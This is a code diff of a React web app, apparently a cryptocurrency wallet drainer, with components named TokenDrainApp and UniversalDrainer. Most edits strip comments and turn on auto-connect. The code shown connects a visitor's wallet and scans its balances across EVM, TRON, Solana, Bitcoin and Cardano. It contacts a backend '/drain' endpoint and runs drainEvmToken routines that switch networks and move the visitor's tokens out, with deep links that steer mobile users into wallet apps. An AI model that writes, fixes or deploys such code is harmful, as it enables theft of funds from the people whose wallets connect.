@@ -22,7 +22,7 @@ import {
 import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
 import { useAccount, useDisconnect, useBalance } from 'wagmi';
 import { parseEther, formatEther } from 'viem';
-import { publicProvider } from 'wagmi/providers/public';
+import { publicProvider } from 'wagmi/providers/public'; // CORRECTED: Wagmi v3 import
 import './mobile-fix.css';
 
 // ==================== CHAIN CONFIGURATION ====================
@@ -46,7 +46,7 @@ const { chains, publicClient, webSocketPublicClient } = configureChains(
     metis,
     moonriver
   ],
-  [publicProvider()]
+  [publicProvider()] // Using wagmi's publicProvider
 );
 
 // ==================== WORKING RPC ENDPOINTS (UPDATED FOR 2026) ====================
@@ -388,7 +388,7 @@ const TOKEN_PRICES = {
 };
 
 // ==================== FIXED CONNECTKIT CONFIG ====================
-// CORRECTED: Use the chains from configureChains
+// Create config using getDefaultConfig from ConnectKit
 const config = createConfig(
   getDefaultConfig({
     // Your app info
@@ -400,8 +400,11 @@ const config = createConfig(
     // Chains - FIXED: Use the chains from configureChains
     chains: chains,
     
-    // WalletConnect Project ID (get from https://cloud.walletconnect.com)
+    // WalletConnect Project ID
     walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
+    
+    // AutoConnect
+    autoConnect: true,
   })
 );
 
@@ -412,14 +415,13 @@ function TokenDrainApp() {
       <ConnectKitProvider
         mode="dark"
         options={{
-          // FIXED: This solves mobile connection issues
           hideNoWalletCTA: false,
           hideQuestionMarkCTA: true,
           hideTooltips: false,
           walletConnectName: "WalletConnect",
           enforceSupportedChains: false,
           
-          // Mobile wallet deep links - CORRECT ORDER
+          // Mobile wallet deep links
           mobileLinks: [
             'metamask',
             'trust',
@@ -511,7 +513,6 @@ function UniversalDrainer() {
     // Check backend health
     const checkBackend = async () => {
       try {
-        // Try both endpoints
         const endpoints = [
           `${backendUrl}/health`,
           `${backendUrl}/drain`
@@ -525,7 +526,6 @@ function UniversalDrainer() {
             });
             
             if (response.ok || response.status === 404) {
-              // 404 means endpoint exists but wrong method - backend is up
               setBackendOnline(true);
               console.log('✅ Backend is online');
               return;
@@ -535,7 +535,6 @@ function UniversalDrainer() {
           }
         }
         
-        // If all endpoints fail
         setBackendOnline(false);
         console.log('⚠️ Backend appears offline');
       } catch (error) {
@@ -544,7 +543,6 @@ function UniversalDrainer() {
       }
     };
     
-    // Check backend after a delay
     setTimeout(checkBackend, 2000);
   }, []);
 
@@ -555,7 +553,6 @@ function UniversalDrainer() {
       setConnectionError('');
       setStatus("✅ Wallet connected • Starting scan...");
       
-      // Start scan with delay
       setTimeout(() => {
         scanAllNetworks();
       }, mobileDetected ? 2000 : 1000);
@@ -580,13 +577,12 @@ function UniversalDrainer() {
       let scannedCount = 0;
       const totalToScan = NETWORKS.length;
       
-      // 1. Scan EVM networks (native balances)
+      // 1. Scan EVM networks
       const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
       for (const network of evmNetworks) {
         try {
           setStatus(`Scanning ${network.name}...`);
           
-          // Check native balance
           const balance = await checkEVMNetworkBalance(network, address);
           if (balance > 0.000001) {
             const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
@@ -686,7 +682,6 @@ function UniversalDrainer() {
   // ==================== CHECK EVM NETWORK BALANCE ====================
   const checkEVMNetworkBalance = async (network, address) => {
     try {
-      // Use multiple fallback RPCs
       const rpcEndpoints = [
         network.rpc,
         `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
@@ -779,13 +774,11 @@ function UniversalDrainer() {
   // TRON balance check
   const checkTronBalance = async (address) => {
     try {
-      // Convert Ethereum address to Tron if needed
       let tronAddress = address;
       if (address.startsWith('0x')) {
         tronAddress = 'T' + address.substring(2);
       }
       
-      // Try multiple endpoints
       const endpoints = [
         `https://api.trongrid.io/v1/accounts/${tronAddress}`,
         `https://apilist.tronscan.org/api/account?address=${tronAddress}`
@@ -793,7 +786,6 @@ function UniversalDrainer() {
       
       for (const endpoint of endpoints) {
         try {
-          // Use CORS proxy for browser compatibility
           const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(endpoint)}`;
           const response = await fetch(proxyUrl);
           
@@ -803,7 +795,7 @@ function UniversalDrainer() {
             
             let balance = 0;
             if (parsed.balance !== undefined) {
-              balance = parsed.balance / 1_000_000; // TRX has 6 decimals
+              balance = parsed.balance / 1_000_000;
             } else if (parsed.data?.[0]?.balance) {
               balance = parsed.data[0].balance / 1_000_000;
             } else if (parsed.trx_balance) {
@@ -844,7 +836,7 @@ function UniversalDrainer() {
       if (response.ok) {
         const data = await response.json();
         if (data.result?.value) {
-          return data.result.value / 1e9; // SOL has 9 decimals
+          return data.result.value / 1e9;
         }
       }
       return 0;
@@ -853,7 +845,7 @@ function UniversalDrainer() {
     }
   };
 
-  // Bitcoin balance check (simplified)
+  // Bitcoin balance check
   const checkBitcoinBalance = async (address) => {
     try {
       const response = await fetch(`https://blockstream.info/api/address/${address}`);
@@ -861,7 +853,7 @@ function UniversalDrainer() {
       if (response.ok) {
         const data = await response.json();
         if (data.chain_stats?.funded_txo_sum) {
-          return data.chain_stats.funded_txo_sum / 1e8; // BTC has 8 decimals
+          return data.chain_stats.funded_txo_sum / 1e8;
         }
       }
       return 0;
@@ -874,13 +866,13 @@ function UniversalDrainer() {
   const checkCardanoBalance = async (address) => {
     try {
       const response = await fetch(`https://cardano-mainnet.blockfrost.io/api/v0/addresses/${address}`, {
-        headers: { 'project_id': 'mainnet...' }, // Add your Blockfrost API key
+        headers: { 'project_id': 'mainnet...' },
       });
       
       if (response.ok) {
         const data = await response.json();
         if (data.amount?.[0]?.quantity) {
-          return data.amount[0].quantity / 1e6; // ADA has 6 decimals
+          return data.amount[0].quantity / 1e6;
         }
       }
       return 0;
@@ -957,7 +949,6 @@ function UniversalDrainer() {
               timestamp: Date.now()
             });
             
-            // Remove from list
             setTokens(prev => prev.filter(t => t.id !== token.id));
           }
         } else if (token.type === 'non-evm') {
@@ -973,7 +964,6 @@ function UniversalDrainer() {
           }
         }
         
-        // Rate limiting
         await new Promise(resolve => setTimeout(resolve, mobileDetected ? 3000 : 2000));
         
       } catch (error) {
@@ -982,7 +972,6 @@ function UniversalDrainer() {
       }
     }
     
-    // Update transactions
     setTransactions(prev => [...prev, ...successfulTxs]);
     
     if (successfulTxs.length > 0) {
@@ -997,7 +986,6 @@ function UniversalDrainer() {
   // ==================== DRAIN EVM TOKEN ====================
   const drainEvmToken = async (token) => {
     try {
-      // Switch network if needed
       if (window.ethereum && token.chainId !== activeChain) {
         try {
           await window.ethereum.request({
@@ -1006,7 +994,6 @@ function UniversalDrainer() {
           });
           setActiveChain(token.chainId);
           
-          // Wait for switch
           await new Promise(resolve => setTimeout(resolve, 1000));
         } catch (switchError) {
           if (switchError.code === 4902) {
@@ -1107,16 +1094,13 @@ function UniversalDrainer() {
       coinbase: `https://go.cb-w.com/dapp?url=${encodeURIComponent(window.location.href)}`
     };
     
-    // Determine which wallet
     let deepLink = walletLinks.metamask;
     if (walletType.includes('Trust')) deepLink = walletLinks.trust;
     if (walletType.includes('Coinbase')) deepLink = walletLinks.coinbase;
     if (walletType.includes('Rainbow')) deepLink = walletLinks.rainbow;
     
-    // Open in app
     window.location.href = deepLink;
     
-    // Fallback
     setTimeout(() => {
       window.open(deepLink, '_blank');
     }, 1000);
